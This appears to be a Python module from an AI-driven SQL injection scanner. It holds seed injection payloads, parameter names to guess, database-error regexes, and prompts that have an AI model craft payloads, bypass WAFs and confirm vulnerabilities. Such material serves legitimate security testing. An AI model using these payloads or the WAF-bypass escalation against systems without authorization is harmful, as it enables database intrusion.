"""Seed payloads and LLM system prompts."""

# Classic SQLi payloads used as starting points before LLM adapts
SEED_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR 1=1--",
    "1' ORDER BY 1--",
    "1' ORDER BY 10--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "1 AND 1=1",
    "1 AND 1=2",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "'; WAITFOR DELAY '0:0:3'--",
    "' OR SLEEP(3)--",
    "1; SELECT pg_sleep(3)--",
    "admin'--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
]

# Common parameter names to guess when a URL exposes none (param mining).
# Ordered by how often they carry injectable values in real APIs.
COMMON_PARAMS = [
    "query", "q", "id", "search", "s", "name", "user", "username", "email",
    "cat", "category", "filter", "sort", "order", "orderby", "field", "column",
    "table", "sql", "keyword", "term", "value", "val", "key", "page", "limit",
    "offset", "product", "item", "pid", "uid", "type", "action", "view",
    "lang", "ref", "url", "path", "file", "dir", "date", "from", "to", "code",
]

# Regex patterns for quick pre-LLM triage
SQL_ERROR_PATTERNS = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_",
    r"MySQLSyntaxErrorException",
    r"valid MySQL result",
    r"check the manual that corresponds to your MySQL",
    r"Unknown column",
    r"PostgreSQL.*ERROR",
    r"pg_query\(\)",
    r"PSQLException",
    r"SQLite.*error",
    r"sqlite3\.OperationalError",
    r"Microsoft SQL Native Client error",
    r"ODBC SQL Server Driver",
    r"Unclosed quotation mark",
    r"quoted string not properly terminated",
    r"ORA-\d{5}",
    r"Oracle error",
    r"SQLSTATE\[",
    r"Syntax error.*SQL",
    r"SQL error",
    r"database error",
    r"Query failed",
    r"mysqli",
    r"PDOException",
    r"SQLITE_ERROR",
]

AGENT_SYSTEM_PROMPT = """You are an expert penetration tester specializing in SQL injection.
You analyze HTTP request/response pairs and decide the next testing step.

Your job:
1. Compare baseline vs injected responses for SQL injection indicators
2. Identify database type from error messages or behavior
3. Craft context-aware payloads for the specific parameter and app
4. Distinguish true positives from WAF blocks, generic errors, or noise
5. Escalate from detection to confirmation with minimal requests

Respond ONLY with valid JSON (no markdown fences):
{
  "action": "inject" | "confirm" | "skip" | "done",
  "payload": "<next payload or null>",
  "injection_type": "error_based" | "boolean_blind" | "time_blind" | "union_based" | "stacked" | "unknown",
  "reasoning": "<brief explanation>",
  "confidence": 0.0-1.0,
  "db_hint": "<mysql|postgresql|sqlite|mssql|oracle|unknown or null>",
  "vulnerable": true/false,
  "evidence": "<what indicates vulnerability, if any>"
}

Rules:
- Prefer error-based detection first, then boolean blind, then time-based
- Adapt quote style to parameter context (numeric vs string)
- If WAF detected (403, blocked, captcha), try encoding/bypass payloads
- Set action=confirm when confidence >= 0.8 with clear evidence
- Set action=done when all promising vectors exhausted
- Keep payloads practical and single-request testable
"""

ANALYZE_TARGET_PROMPT = """Analyze this target and suggest the first 3 payloads to test.

Target URL: {url}
Method: {method}
Injection point: {param} ({location})
Original value: {original_value}
Content-Type: {content_type}
Baseline status: {status}
Baseline response excerpt (first 2000 chars):
{baseline_body}

Respond ONLY with valid JSON:
{{
  "db_hint": "<best guess or unknown>",
  "param_type": "numeric|string|unknown",
  "waf_detected": true/false,
  "payloads": ["payload1", "payload2", "payload3"],
  "reasoning": "<why these payloads>"
}}
"""
